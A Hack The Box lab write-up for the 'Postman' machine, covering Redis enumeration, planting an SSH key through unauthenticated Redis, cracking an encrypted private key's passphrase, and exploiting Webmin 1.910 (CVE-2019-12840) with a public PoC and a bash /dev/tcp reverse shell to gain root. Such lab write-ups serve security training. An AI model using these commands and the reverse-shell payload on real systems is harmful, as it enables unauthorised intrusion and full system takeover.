---
Primary_category: "[[EASY]]"
title: POSTMAN
draft: false
banner: https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
banner_y: 0.88286
tags:
  - Linux
  - HTB
  - HTBEasy
  - Redis
  - SSHKeys
  - FileUpload
  - InformationLeakage
  - HashCracking
  - ssh2john
  - RCE
  - Webmin
cssclasses:
---

###### PRIMARY CATEGORY → [[EASY]]

#### *Summary*

- ***Enumerating Redis using Redis-cli***
- ***Remote SSH Authentication via File Upload on Redis***
- ***PE: SSH Private Key Disclosure***
- ***Extracting a Crackable Hash from an RSA Private Key with SSH2John***
- ***Cracking hashes using Hashcat***
- ***Authenticated RCE on Webmin leveraging the Software Package Update feature***

![[POSTMAN-20251218200147901.webp|400]]

> ***Zoom in***

---

#### *Setup*

Directory creation with the Machine's Name

```bash
mkdir Postman && cd !$
```

Creation of a *Pentesting Folder Structure* to store all the information related to the target

```bash
mkdir {Scans,Data,Tools}
```

---

#### *Recon*

##### *OS Identification*

First, proceed to identify the *Target Operative System*. This can be done by a simple `ping` taking into account the *TTL Unit*

The standard values are →

- ***About 64 → Linux***
- ***About 128 → Windows***

```bash
ping -c1 10.129.2.1
```

> [!NOTE]- *Command Output*
>
> ```bash
> PING 10.129.2.1 (10.129.2.1) 56(84) bytes of data.
> 64 bytes from 10.129.2.1: icmp_seq=1 ttl=63 time=48.2 ms
> 
> --- 10.129.2.1 ping statistics ---
> 1 packets transmitted, 1 received, 0% packet loss, time 0ms
> rtt min/avg/max/mdev = 48.208/48.208/48.208/0.000 ms
> ```
>

As mentioned, according to the TTL, It seems that It is a ***Linux Target***

##### *Port Scanning*

###### *General Scan*

Let's run a *Nmap* Scan to check what *TCP* Ports are opened in the machine

The Scan result is exported in a grepable format for subsequent *Port Parsing*

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG Postman.allPorts 10.129.2.1 
```

> [!BUG]- *Postman.allPorts*
>
> ```bash
> # Nmap 7.94SVN scan initiated Thu Dec 18 20:37:57 2025 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG Postman.allPorts 10.129.2.1
> # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
> Host: 10.129.2.1 ()	Status: Up
> Host: 10.129.2.1 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 6379/open/tcp//redis///, 10000/open/tcp//snet-sensor-mgmt///
> # Nmap done at Thu Dec 18 20:38:10 2025 -- 1 IP address (1 host up) scanned in 13.00 seconds
> ```
>

**Open Ports →**

```bash
22, 80, 6379 and 10000
```

###### *Comprehensive Scan*

We can apply a little filter to the *Postman.allPorts* file to extract the ports and conduct a more comprehensive scan on them by extracting the services and their version running on each port and also executing some default scripts to gather more information

>  ***Note that this scan is also exported to have evidence at hand***

```bash
nmap -p$( grep -ioP --color -- '\s\d{1,5}(?=/open)' Postman.allPorts | xargs | sed 's@\s@,@g' ) -sCV -v -n -Pn --disable-arp-ping -oN Postman.targeted 10.129.2.1
```

> [!BUG]- *Postman.targeted*
>
> ```bash
> # Nmap 7.94SVN scan initiated Thu Dec 18 20:39:26 2025 as: nmap -p22,80,6379,10000 -sCV -v -n -Pn --disable-arp-ping -oN Postman.targeted 10.129.2.1
> Nmap scan report for 10.129.2.1
> Host is up (0.049s latency).
> 
> PORT      STATE SERVICE VERSION
> 22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
> | ssh-hostkey: 
> |   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
> |   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
> |_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
> 80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
> | http-methods: 
> |_  Supported Methods: GET POST OPTIONS HEAD
> |_http-server-header: Apache/2.4.29 (Ubuntu)
> |_http-title: The Cyber Geek's Personal Website
> |_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
> 6379/tcp  open  redis   Redis key-value store 4.0.9
> 10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
> | http-methods: 
> |_  Supported Methods: GET HEAD POST OPTIONS
> |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
> |_http-favicon: Unknown favicon MD5: 066AF1F6A59FCB67495B545A6B81F371
> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
> 
> Read data files from: /usr/bin/../share/nmap
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> # Nmap done at Thu Dec 18 20:40:07 2025 -- 1 IP address (1 host up) scanned in 40.79 seconds
> ```
>

##### *80 - HTTP*

Let's start with the *HTTP* ports. It seems we have a web application hosted on port 80

We can enumerate the technologies running behind this web application with both *whatweb* and wappalyzer

```bash
whatweb 'http://10.129.2.1'
```

> [!NOTE]- *Command Output*
>
> ```bash
> http://10.129.2.1 [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.2.1], JQuery, Script, Title[The Cyber Geek's Personal Website], X-UA-Compatible[IE=edge]
> ```
>

But there is nothing interesting

We move on to the browser in order to inspect the website and we get the following content

![[POSTMAN-20251218204809383.webp|350]]

> ***Zoom in***

It appears that it has no functionality. We get nothing either if we inspect the source code looking for any sensitive comments

![[POSTMAN-20251218204954166.webp|300]]

> ***Zoom in***

Let's fuzz to discover some directories first

```bash
ffuf -v -t 200 -w /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://10.129.2.1/FUZZ'
```

> [!NOTE]- *Command Output*
>
> ```bash
 > :: Method           : GET
>  :: URL              : http://10.129.2.1/FUZZ
>  :: Wordlist         : FUZZ: /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt
>  :: Follow redirects : false
>  :: Calibration      : false
>  :: Timeout          : 10
>  :: Threads          : 200
>  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
> ________________________________________________
> 
> [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 47ms]
> | URL | http://10.129.2.1/upload
> | --> | http://10.129.2.1/upload/
>     * FUZZ: upload
> 
> [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 48ms]
> | URL | http://10.129.2.1/css
> | --> | http://10.129.2.1/css/
>     * FUZZ: css
> 
> [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 47ms]
> | URL | http://10.129.2.1/js
> | --> | http://10.129.2.1/js/
>     * FUZZ: js
> 
> [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 47ms]
> | URL | http://10.129.2.1/fonts
> | --> | http://10.129.2.1/fonts/
>     * FUZZ: fonts
> 
> [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 8290ms]
> | URL | http://10.129.2.1/images
> | --> | http://10.129.2.1/images/
>     * FUZZ: images
> 
> [Status: 200, Size: 3844, Words: 1027, Lines: 92, Duration: 48ms]
> | URL | http://10.129.2.1/
>     * FUZZ: 
> 
> [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 47ms]
> | URL | http://10.129.2.1/server-status
>     * FUZZ: server-status
> 
> :: Progress: [220545/220545] :: Job [1/1] :: 187 req/sec :: Duration: [0:01:28] :: Errors: 0 ::
> ```
>

We can inspect them one by one but we will not find anything

Before digging deeper, let's move on to the other web application hosted on port 10000

##### *10000 - HTTP*

This time, we can directly access the website using the browser to check *Wappalyzer*

And we are warned to access another *URL* protected by a *TLS Certificate*, which appears to be self-signed

Once we accept the risk and continue, we find a *Webmin Panel* prompting for authentication

![[POSTMAN-20251218210112920.webp|400]]

> ***Zoom in***

We can try to log in with default credentials or something like *webmin:webmin*, *admin:admin* and so on, but none are valid

Take into account that system users can normally log in to *Webmin*, so we should think about *Webmin* when we obtain valid credentials

If we inspect the source code of the login page, we won´t get anything interesting either such as the source code to search for vulnerabilites for the given version

We can get its version once we access the panel as an authenticated user. As long as I know, there is no resource that we can request without being authenticated to list the current *webmin* version

It does not make much sense to start fuzzing either. So, let's move on to the next port

##### *6379 - REDIS*

And we have a *REDIS* server, which does not require authentication by default, so we can access the information stored in it

First, we can start by listing the existing *KEYSPACES* with the *INFO* command. We will get the location of the *redis* configuration file as well

```bash
redis-cli -h 10.129.2.1
> INFO
```

But there is no *KEYSPACE*, therefore there is no relevant information apart from the current working directory and the location of the configuration file

Here we have the latter →

```bash
config_file:/etc/redis/redis.conf
```

Regarding the former, we can gather it as follows →

```bash
redis-cli -h 10.129.2.1 CONFIG GET DIR
```

> [!NOTE]- *Command Output*
>
> ```bash
> 1) "dir"
> 2) "/var/lib/redis"
> ```
>

As we do not know the *server-side language programming* that the web application running on port 80 is using, it does not make much sense to try to upload a web shell through *redis*

However, there is an interesting exploitation technique on *redis* related to uploading an *SSH public key* as an *authorized_keys* file to the *<WORKING_DIRECTORY>/.ssh* directory

We could try it to see if it works, so let's go for it

---

#### *Exploitation*

##### *"File Upload" on Redis allows remote authentication via SSH*

As mentioned, the first step is to create an *SSH Public-Private Key Pair*

```bash
ssh-keygen -t rsa -b 4096 -f redis
```

> [!NOTE]- *Command Output*
>
> ```bash
> Generating public/private rsa key pair.
> Enter passphrase (empty for no passphrase): 
> Enter same passphrase again: 
> Your identification has been saved in redis
> Your public key has been saved in redis.pub
> The key fingerprint is:
> SHA256:WeGPqwAp4bLLTMms9clhC1TPB84c/JdliYp2wD6KN1o root@parrot
> The key's randomart image is:
> +---[RSA 4096]----+
> |          .      |
> |     o   . o .   |
> |  . . *   + +    |
> | . o O * + *     |
> |. + o @ S + .    |
> |o+.o + + . .     |
> |.=+ E .   .      |
> |=o O = . .       |
> |oo. =   .        |
> +----[SHA256]-----+
> ```
>

Next, we will create a file with the content of the public key preceded and followed by two line breaks and import the file into redis by creating a new *KEYSPACE*

```bash
printf "\n\n%s\n\n" "$(< redis.pub )" > foo.txt
```

```bash
cat foo.txt | redis-cli -h '10.129.2.1' -x set ssh_key
```

Then, we set the working directory to */var/lib/redis/.ssh* and save the uploaded public key as *authorized_keys*

```bash
redis-cli -h '10.129.2.1'
> config set dir /var/lib/redis/.ssh
> config set dbfilename "authorized_keys"
> save
```

---

#### *Shell as System User*

After that, all that remains is to connect to the server as the *redis* user via *SSH* by providing the *private key* during the authentication

```bash
ssh -i redis redis@10.129.2.1
```

Perform the following actions to have a fully interactive terminal

```bash
export TERM=xterm-256color # Allow actions such as C-l and Colored Terminal
. /etc/skel/.bashrc
```

---

#### *Privesc #1*

***Initial Non-Privileged User → Redis***

##### *Disclosure and Cracking of SSH-Protected Private Key*

As always, we can start by listing the *sudo* privileges

```bash
sudo -l
```

> [!NOTE]- *Command Output*
>
> ```bash
> [sudo] password for redis:
> ```
>

But we are prompted for a password which we do not have...

The current user does not belong to any interesting group either

```bash
id
```

> [!NOTE]- *Command Output*
>
> ```bash
> uid=107(redis) gid=114(redis) groups=114(redis)
> ```
>

We can look for readable files within the *home* directory

```bash
find /home/ -readable -type f 2> /dev/null -ls
```

> [!NOTE]- *Command Output*
>
> ```bash
>    143265      4 -rw-r--r--   1 Matt     Matt         3771 Aug 25  2019 /home/Matt/.bashrc
>    158997      4 -rw-rw-r--   1 Matt     Matt           66 Aug 26  2019 /home/Matt/.selected_editor
>    143266      4 -rw-r--r--   1 Matt     Matt          807 Aug 25  2019 /home/Matt/.profile
>    157974      4 -rw-rw-r--   1 Matt     Matt          181 Aug 25  2019 /home/Matt/.wget-hsts
>    143267      4 -rw-r--r--   1 Matt     Matt          220 Aug 25  2019 /home/Matt/.bash_logout
> ```
>

We can only access the *Matt's home* directory, but there are no interesting files

Regarding the services running in the target, let's check the *TCP* ports listening locally

```bash
netstat -vlntp
```

> [!NOTE]- *Command Output*
>
> ```bash
 > Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
> tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      646/redis-server 0. 
> tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -                   
> tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
> tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
> tcp6       0      0 ::1:6379                :::*                    LISTEN      646/redis-server 0. 
> tcp6       0      0 :::80                   :::*                    LISTEN      -                   
> tcp6       0      0 :::22                   :::*                    LISTEN      - 
> ```
>

But there is no port that is not accesible externally

It would be interesting to check some system directories such as */opt*, */var/backup*, */var/www/* and so on

If we list the content of the */opt* directory, we find a copy of an *protected SSH private key*

```bash
find /opt -type f -ls
```

> [!NOTE]- *Command Output*
>
> ```bash
> 158996      4 -rwxr-xr-x   1 Matt     Matt         1743 Aug 26  2019 /opt/id_rsa.bak
> ```
>

As mentioned, this private key is symmetrically encrypted with a passphrase. However, we can generate a crackable hash from it by running a tool such as ***[ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)***

```bash
ssh2john id_rsa.bak > id_rsa.hash
```

> [!BUG]- *id_rsa.hash*
>
> ```bash
> id_rsa.bak:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0...<SNIP>...
> ```
>

Then, we will try to crack the above hash to get the passphrase and log in to the target remotely via *SSH* with the obtained *private key*

Since the only user we have seen is *Matt*, we will try to log in as *Matt*. We can check the */etc/passwd* file as well to see which users have a shell assigned

```bash
grep sh\$ /etc/passwd
```

> [!NOTE]- *Command Output*
>
> ```bash
> root:x:0:0:root:/root:/bin/bash
> Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
> redis:x:107:114::/var/lib/redis:/bin/bash
> ```
>

Based on the above output, it is almost certainly the private key for the user *Matt*

Let's start with the cracking process

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

> [!NOTE]- *Command Output*
>
> ```bash
> Using default input encoding: UTF-8
> Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
> Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
> Cost 2 (iteration count) is 2 for all loaded hashes
> Will run 16 OpenMP threads
> Press 'q' or Ctrl-C to abort, almost any other key for status
> computer2008     (id_rsa.bak)     
> 1g 0:00:00:00 DONE (2025-12-23 14:33) 16.66g/s 4115Kp/s 4115Kc/s 4115KC/s conjunto..clumsy1
> Use the "--show" option to display all of the cracked passwords reliably
> Session completed. 
> ```
>

We get an error if we try to log in to the system via *SSH* as *Matt*

```bash
ssh -p22 -i id_rsa.bak Matt@10.129.2.1
```

> [!NOTE]- *Command Output*
>
> ```bash
> Enter passphrase for key 'id_rsa.bak': 
> Connection closed by 10.129.2.1 port 22
> ```
>

This occurs due to certain restrictions that have been implemented within the *SSH* configuration file, namely the *DenyUsers* directive

```bash
grep -i -- DenyUsers /etc/ssh/sshd_config 
```

> [!NOTE]- *Command Output*
>
> ```bash
> DenyUsers Matt
> ```
>

However, we can check if there is a *password reuse* and this password is being used by the *Matt* user locally

```bash
su - Matt
```

> [!NOTE]- *Command Output*
>
> ```bash
> Password: 
> Matt@Postman:~$ 
> ```
>

And it is!

#### *Privesc #2*

***Initial Non-Privileged User → Matt***

##### *Authenticated RCE on Webmin through the Software Package Update*

As stated, system users can normally log in to the *Webmin Panel*, so we can do the same with the user *Matt*

![[POSTMAN-20251223144606911.webp|200]]

> ***Zoom in***

And we have log in succesfully 😊. Once inside, we can check the *Webmin Version* on the *Dashboard* section and search for any vulnerability the given version

![[POSTMAN-20251223145014353.webp|350]]

> ***Zoom in***

```bash
searchsploit webmin 1.910
```

> [!NOTE]- *Command Output*
>
> ```bash
>  Exploit Title                                                                                                                                                                                                        |  Path
> Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                                                                                                                | linux/remote/46984.rb
> Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                                                                                                         | linux/webapps/47330.rb
> Shellcodes: No Results
> ```
>

There is an *RCE* for that version, it appears to be authenticated as there is a function that handles the authentication process

This vulnerability corresponds to the *CVE-2019-12840*

It basically consists of sending a specific string contaning any system command through a *POST* request to the */package-updates/update.cgi?xnavigation=1* URL

Therefore, we can look for any *PoC* on *github.com* and replicate its steps or execute it directly

Let's download ***[it](https://github.com/bkaraceylan/CVE-2019-12840_POC)*** and run it. But first, we must set a *TCP* listener to receive the incoming shell

```bash
nc -nlvp 4444
```

```bash
curl --silent --location --request GET "" --output exploit.py
```

```bash
python3 -m venv .venv
. !$/bin/activate
pip3 install -r requirements.txt
```

```bash
python3 exploit.py -u 'https://10.129.2.1' --port 10000 --user='Matt' --password='computer2008' --cmd='bash -i &> /dev/tcp/10.10.15.174/4444 0>&1'
```

> [!NOTE]- *Command Output*
>
> ```bash
> Listening on 0.0.0.0 4444
> Connection received on 10.129.2.1 37230
> bash: cannot set terminal process group (788): Inappropriate ioctl for device
> bash: no job control in this shell
> root@Postman:/usr/share/webmin/package-updates/# whoami
> whoami
> root
> root@Postman:/usr/share/webmin/package-updates/#
> ```
>

And we received a shell as *root*!

```bash
whoami
```

> [!NOTE]- *Command Output*
>
> ```bash
> root
> ```
>

From there, all that remains is to grab the *root.txt* flag 😊

```bash
cat ~/root.txt
```